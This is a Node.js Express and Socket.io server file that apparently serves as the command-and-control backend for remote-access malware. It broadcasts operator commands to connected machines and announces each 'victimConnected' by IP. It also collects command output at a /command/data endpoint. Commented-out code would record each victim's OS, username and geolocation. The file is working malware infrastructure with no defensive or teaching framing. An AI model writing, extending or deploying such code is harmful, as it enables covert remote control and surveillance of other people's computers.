const express = require("express")
const app = express()
const cors = require("cors")
const socket = require("socket.io")
const USER = require("./api/module/user")
const db = require("./api/config/dbconnect")
const init_router = require("./api/router/index")

require("dotenv").config()
const PORT = 5678
app.use(cors())
app.use(express.json())

db()
init_router(app)

const all_data = []
app.use("/command/data", (req , res) => {
  try {
    res.status(200).json({
      success : true,
      data : all_data
    })
    while (all_data.length > 0) {
      all_data.pop()
    }
    return 1
  }catch(err) {
    return res.status(500).json({
      success : false, 
      message : "error from server"
    })
  }
})

const server = app.listen(PORT , () => {
  console.log(`server is running ${PORT}`)
})

const io = socket(server, {
  cors : {
        origin : "*",
        credentials : true,
        methods : ["GET", "PUT", 'PATCH', 'DELETE', 'POST']
    }
  })


io.on("connection", (socket) => {
  socket.on("command", (data) => {
      socket.broadcast.emit("server_send_command", data)
  })
  socket.on("information", async(data) => {
      try {
        console.log(`user connected ${socket.ip}`)
        socket.broadcast.emit("victimConnected", {ip : socket.ip})
      } catch(err) {
        console.log(err.message)
      }
      // const check_user = await USER.findOne({ip_address : data.data[5]})
      // socket.ip = data.data[5]
      // if (check_user) {
      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {online : true}}, {new : true})
      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$inc : {session : 1}}, {new : true})
      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lng : data.data[6].lon || 21.0292}}, {new : true})
      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lat : data.data[6].lat || 105.8526}}, {new : true})
      // }else {
      //   const newUser = await new USER({
      //     ip_address : data.data[5],
      //     system : data.data[0],
      //     release : data.data[1],
      //     version : data.data[2],
      //     machine : data.data[3],
      //     user_name : data.data[4],
      //     lng : data.data[6].lon,
      //     lat : data.data[6].lat,
      //     online : true
      //   })
      //   newUser.save()
      // }
  })
  socket.on("send_data_command", (data) => {
    all_data.push(data)
  })

  
  socket.on("disconnect", async() => {
    console.log("user ip disconnected" + socket.ip)
    await USER.findOneAndUpdate({ip_address : socket.ip}, {
      $set : {
        online : false
      }
    })
  })
})
